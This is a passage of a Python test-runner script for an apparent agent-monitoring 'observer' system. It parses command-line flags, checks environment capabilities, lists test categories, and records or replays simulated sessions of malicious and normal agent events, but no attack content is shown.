        if cat.requires_web and not env.app_running:
            available = False
            skip_reason = " (需 app.py)"
        if cat.requires_ebpf and not env.has_ebpf:
            available = False
            skip_reason = " (需 eBPF)"

        status = "✅ 可用" if available else f"⏭️  跳过{skip_reason}"
        print(f"\n  [{cat.name:12s}] {cat.label} — {status}")
        print(f"    {cat.description}")

        if cat.run_type == "pytest" and cat.files:
            for f in cat.files:
                exists = os.path.exists(os.path.join(TESTS_DIR, f)) or os.path.exists(os.path.join(OBSERVER_DIR, f))
                mark = "  ✓" if exists else "  ✗"
                print(f"      {mark} {f}")
        elif cat.run_type == "scenario":
            total = sum(len([f for f in os.listdir(os.path.join(SCENARIOS_DIR, d)) if f.endswith(".yaml")])
                        for d in os.listdir(SCENARIOS_DIR) if os.path.isdir(os.path.join(SCENARIOS_DIR, d)))
            print(f"      📋 {total} 个 YAML 场景文件")
        elif cat.run_type == "script":
            print(f"      📜 sudo_test/run_all.sh")

    print(f"\n{'=' * 70}")


def main():
    parser = argparse.ArgumentParser(
        description="方寸观察者模拟学习系统 — 统一测试入口",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
示例:
  python test.py --unit             # 仅运行单元测试
  python test.py --unit --collector # 运行单元+采集器测试
  python test.py --all              # 运行全部可用测试
  python test.py --scenario         # 运行 37 个场景回放
  python test.py --e2e              # 端到端测试（需 root）
  python test.py --check            # 检测环境能力
  python test.py --list             # 列出所有测试分类
        """)
    parser.add_argument("--all", action="store_true", help="运行全部可用测试")
    parser.add_argument("--unit", action="store_true", help="单元测试")
    parser.add_argument("--collector", action="store_true", help="采集器测试")
    parser.add_argument("--integration", action="store_true", help="集成测试")
    parser.add_argument("--scenario", action="store_true", help="场景测试（simulation 模式）")
    parser.add_argument("--e2e", action="store_true", help="端到端测试（需 root）")
    parser.add_argument("--web", action="store_true", help="Web API 测试")
    parser.add_argument("--check", action="store_true", help="仅检测环境能力")
    parser.add_argument("--list", action="store_true", help="列出所有测试分类")
    parser.add_argument("--filter", default="", help="场景过滤器（如 n01, a02）")
    parser.add_argument("--record", action="store_true",
                        help="开始录制（simulation 模式，自动录制恶意+正常场景）")
    parser.add_argument("--replay", type=str, default=None, metavar="SESSION_ID",
                        help="回放指定录制会话（如 20260731_143025）")

    args = parser.parse_args()

    # 环境检测
    env = EnvCapabilities()
    env.detect()
    categories = get_categories()

    if args.check:
        print("\n  环境能力检测:")
        for line in env.summary():
            print(f"  {line}")
        print()
        return 0

    # 录制-回放 CLI 参数
    if args.record:
        sys.path.insert(0, OBSERVER_DIR)
        from recorder.session_recorder import SessionRecorder
        recorder = SessionRecorder(
            records_dir=RECORDS_DIR,
            agent_id="record-agent",
            collect_mode="simulation",
        )
        recorder.start()
        print(f"\n  Recording session: {recorder.session_id}")
        print(f"  Recording all built-in scenarios (malicious + normal + DeepAgent)...")
        all_events = (
            _builtin_malicious_events("record-agent")
            + _builtin_normal_events("record-agent")
            + _builtin_da01_events("record-agent")
            + _builtin_da02_events("record-agent")
            + _builtin_da03_events("record-agent")
            + _builtin_da04_events("record-agent")
        )
        for evt in all_events:
            recorder.write_event(evt)
            print(f"    [REC] {evt.event_type:10s} | {_short_event_desc(evt)}")
        summary = recorder.stop()
        print(f"\n  Done: {summary['event_count']} events -> {summary['events_file']}")
        return 0

    if args.replay:
        sys.path.insert(0, OBSERVER_DIR)
        from recorder.session_recorder import SessionRecorder
        from recorder.replay_engine import ReplayEngine
        session_dir = os.path.join(RECORDS_DIR, args.replay)
        if not os.path.isdir(session_dir):
            print(f"  ERROR: Session not found: {args.replay}")
            recordings = SessionRecorder.list_recordings(RECORDS_DIR)
            if recordings:
                print(f"  Available sessions:")
                for r in recordings:
                    print(f"    {r['session_id']}  ({r['event_count']} events)")
            return 1
        config_path = os.path.join(OBSERVER_DIR, "config.yaml")
        config = {}
        if os.path.isfile(config_path):
            import yaml
            with open(config_path, "r", encoding="utf-8") as f:
                config = yaml.safe_load(f) or {}
        engine = ReplayEngine(config)
        engine.replay(session_dir)
        return 0

    if args.list:
        list_tests(env, categories)
        return 0

    # 确定要运行的分类
    selected = []
    has_flag = any([args.all, args.unit, args.collector, args.integration,
                    args.scenario, args.e2e, args.web, args.record,
                    args.replay is not None])

    if not has_flag:
        # 交互式菜单（循环，支持录制-回放多步操作）
        while True:
            selected = interactive_menu(env, categories)
            if not selected:
                return 0
            if selected == ["check"]:
                print("\n  环境能力:")
                for line in env.summary():
                    print(f"  {line}")
                print()
                continue
            # 退出选项
            if "exit" in selected:
                return 0
            run_selected(selected, env, categories)
            # 测试完成后返回菜单（录制-回放需要多步操作）
    else:
        if args.all:
            selected = ["unit", "collector", "integration", "scenario", "e2e", "web"]
        else:
            if args.unit:
                selected.append("unit")
            if args.collector:
                selected.append("collector")
            if args.integration:
                selected.append("integration")
            if args.scenario:
                selected.append("scenario")
            if args.e2e:
                selected.append("e2e")
            if args.web:
                selected.append("web")

    ok = run_selected(selected, env, categories)
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
